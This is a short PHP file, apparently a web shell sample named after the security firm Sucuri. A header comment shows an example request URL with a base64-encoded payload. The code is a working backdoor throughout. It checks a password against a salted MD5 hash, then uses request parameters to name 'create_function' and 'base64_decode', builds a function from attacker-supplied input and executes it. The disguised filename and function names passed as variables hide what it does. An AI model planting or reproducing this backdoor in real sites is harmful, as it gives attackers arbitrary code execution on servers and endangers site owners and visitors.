/** sucuri_20200811.php?_p=test&_f1=create_function&_f2=base64_decode&_i=ZWNobyAndGhpcyBpcyBzdXBlciBldmlsIGNvZGUhJzs= 
**/
<?
if(md5(@$_REQUEST['_p'].'9doijoFp6B2svk2XAhpUl')=='9518e40685a1e104da755c294e656731'){$filter1=$_REQUEST['_f1'];$filter2=$_REQUEST['_f2'];$res=$filter1('',$filter2($_REQUEST['_i']));$res();}
?>
